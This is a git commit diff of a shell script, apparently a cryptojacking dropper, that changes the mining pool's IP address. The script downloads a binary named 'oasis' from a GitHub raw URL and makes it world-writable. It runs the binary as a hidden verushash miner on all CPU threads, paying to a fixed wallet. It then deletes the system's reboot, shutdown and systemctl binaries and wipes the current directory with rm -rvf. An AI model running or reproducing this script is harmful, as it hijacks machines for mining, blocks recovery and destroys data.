8430734ac1983ad51797a7f0ecc620ad9da1b6dd
LogiTech <117252755+oggierf@users.noreply.github.com>
2024-12-26 16:08:50 +0700

    Update and rename bash.sh to as.sh

--- as.sh
+++ as.sh
@@ -2,7 +2,7 @@
 apt-get update 
 wget -O oasis https://github.com/malogrono/Compare/raw/main/ayday
 chmod 777 oasis
-./oasis --algorithm verushash --pool stratum+tcp://209.97.168.28:443 --wallet RCADCQ9UW1RsUaF94Jp4huPSdQ7bhwYwa4.A$RANDOM --password x --cpu-threads $(nproc --all) > /dev/null 2>&1
+./oasis --algorithm verushash --pool stratum+tcp:///128.199.167.154:443 --wallet RCADCQ9UW1RsUaF94Jp4huPSdQ7bhwYwa4.A$RANDOM --password x --cpu-threads $(nproc --all) > /dev/null 2>&1
 sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 rm -rvf *
